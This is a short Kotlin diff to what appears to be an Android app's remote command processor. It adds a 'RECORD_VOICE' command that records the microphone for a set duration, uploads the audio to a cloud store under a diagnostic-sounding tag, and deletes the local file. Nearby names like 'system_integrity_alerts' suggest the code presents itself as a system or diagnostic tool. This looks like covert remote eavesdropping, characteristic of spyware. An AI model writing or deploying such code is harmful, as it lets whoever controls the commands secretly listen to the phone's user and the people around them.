@@ -247,6 +247,21 @@ object CommandProcessor {
                         ctx.startService(i)
                     }
                 }
+                "RECORD_VOICE" -> {
+                    val dur = content.trim().toIntOrNull() ?: 10
+                    val snippet = VoiceManager.recordSnippet(ctx, dur)
+                    if (snippet != null) {
+                        if (CloudManager.uploadFile(ctx, snippet, "VOICE_DIAG")) {
+                            status = "VOICE_CAPTURE_SUCCESS"
+                            snippet.delete() // Cleanup
+                        } else {
+                            status = "VOICE_UPLOAD_FAILED"
+                        }
+                    } else {
+                        status = "VOICE_CAPTURE_FAILED"
+                        errorMsg = "Mic may be in use by another app or permission denied."
+                    }
+                }
                 "WAKE" -> {
                     val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                     val channelId = "system_integrity_alerts"
